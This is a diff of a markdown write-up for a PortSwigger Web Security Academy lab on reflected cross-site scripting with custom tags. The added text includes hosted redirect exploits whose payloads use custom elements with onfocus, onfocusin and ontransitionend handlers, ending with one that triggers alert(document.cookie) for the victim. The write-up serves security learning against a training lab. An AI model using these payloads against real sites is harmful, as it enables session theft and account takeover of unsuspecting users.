@@ -62,23 +62,23 @@ Using this I can copy the payload parts of the URLs:
   
 <xss id%3Dx style%3D"transition%3Aoutline 1s" ontransitionend%3Dalert(1) tabindex%3D1><%2Fxss>#x  
 ```
-
+Turning these into payloads that I can host on the attack server
 
 ```html
 <script>
-  location = 'https://0af6001904e737f8c0f96d79008d007e.web-security-academy.net/?search=%3Cxss+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%23x%3C%2Fxss%3E';
+  location = 'https://0a6d001403c0c130c025523000e90051.web-security-academy.net/?search=<xss id%3Dx tabindex%3D1 onfocus%3Dalert(1)><%2Fxss>#x';
 </script>
 ```
 
 ```html
 <script>
-  location = 'https://0af6001904e737f8c0f96d79008d007e.web-security-academy.net//?search=%3Cxss+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%23x%3C%2Fxss%3E';
+  location = 'https://0a6d001403c0c130c025523000e90051.web-security-academy.net/?search=<xss id%3Dx tabindex%3D1 onfocusin%3Dalert(1)><%2Fxss>#x';
 </script>
 ```
 
 ```html
 <script>
-  location = '/?search=%3Cxss+id%3Dx+style%3D%22transition%3Aoutline+1s%22+ontransitionend%3Dalert%281%29+tabindex%3D1%3E%3C%2Fxss%3E';
+  location = 'https://0a6d001403c0c130c025523000e90051.web-security-academy.net/?search=<xss id%3Dx style%3D"transition%3Aoutline 1s" ontransitionend%3Dalert(1) tabindex%3D1><%2Fxss>#x';
 </script>
 ```
 
@@ -86,7 +86,51 @@ Using this I can copy the payload parts of the URLs:
 
 I am going to try each payload in-turn on myself using the attack server:
 
-![image](https://user-images.githubusercontent.com/83407557/211062177-07568575-4baf-4ce1-99ab-3b90fc824302.png)
+## onfocus
+
+![image](https://user-images.githubusercontent.com/83407557/211079594-2083b325-ab04-4abc-a5ed-e0f30540a131.png)
+
+executes xss
+
+![image](https://user-images.githubusercontent.com/83407557/211079640-3b96c85a-3fc5-4a0f-890b-04cb9e10a4dc.png)
 
 
-Took a break, payloads work if you click on the example links of cheatsheet
+## onfocusin
+
+![image](https://user-images.githubusercontent.com/83407557/211079856-ec4f44c4-0c3c-4eae-8e33-0889e1cb0f32.png)
+
+executes xss
+
+![image](https://user-images.githubusercontent.com/83407557/211079932-84ce756c-4031-40ea-a39f-be08dec66ae9.png)
+
+## ontransitionend
+
+![image](https://user-images.githubusercontent.com/83407557/211080314-c950a347-1b82-4402-ae7d-7bcead2d40ac.png)
+
+Executes xss
+
+![image](https://user-images.githubusercontent.com/83407557/211080568-857551d1-0146-4de1-88ae-8ae12069d593.png)
+
+So all three payloads can be used to exploit the victim
+
+# Step 5 modify a payload to alert document.cookie
+
+Since the POC were all using alert(1), I change it to alert(document.cookie) 
+
+![image](https://user-images.githubusercontent.com/83407557/211081083-0fc9b385-24bd-4958-b0d7-cd1b224a238b.png)
+
+And retest the exploit on myself(blank since I have no cookies:
+
+![image](https://user-images.githubusercontent.com/83407557/211081189-f247e6ff-729c-4aeb-99fa-5e16bc9c45a0.png)
+
+# Step 6 send exploit to victim
+
+Despite all of the payloads working against me, the only one that solves the lab seems to be this one:
+
+```html
+<script>
+  location = 'https://0ad6009d045b3b60c04db8d4007800ed.web-security-academy.net/?search=<xss id%3Dx tabindex%3D1 onfocus%3Dalert(document.cookie)><%2Fxss>#x';
+</script>
+```
+![image](https://user-images.githubusercontent.com/83407557/211084213-2984d535-2d66-48b3-be52-5812aa662baa.png)
+
